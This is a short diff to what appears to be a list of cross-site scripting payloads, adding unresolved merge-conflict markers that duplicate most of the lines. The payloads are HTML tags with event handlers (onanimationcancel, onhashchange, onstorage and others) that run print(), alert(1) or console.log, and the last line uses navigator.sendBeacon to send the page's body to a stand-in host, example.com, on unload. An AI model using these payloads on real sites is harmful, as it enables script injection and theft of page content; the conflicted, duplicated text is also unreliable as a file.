@@ -1,3 +1,4 @@
+<<<<<<< HEAD
 <xss onanimationcancel="print()" style="animation:10s ease-in-out 0s 1 x"></xss>
 <body onbeforeprint=console.log(1)>
 <body onhashchange="print()">
@@ -5,4 +6,13 @@
 <body onpopstate=print()>
 <body onresize="print()">
 <body onstorage=alert(1)>
+=======
+<xss onanimationcancel="print()" style="animation:10s ease-in-out 0s 1 x"></xss>
+<body onbeforeprint=console.log(1)>
+<body onhashchange="print()">
+<body onmessage=print()>
+<body onpopstate=print()>
+<body onresize="print()">
+<body onstorage=alert(1)>
+>>>>>>> master
 <body onunload=navigator.sendBeacon('//example.com',document.body.innerHTML)>
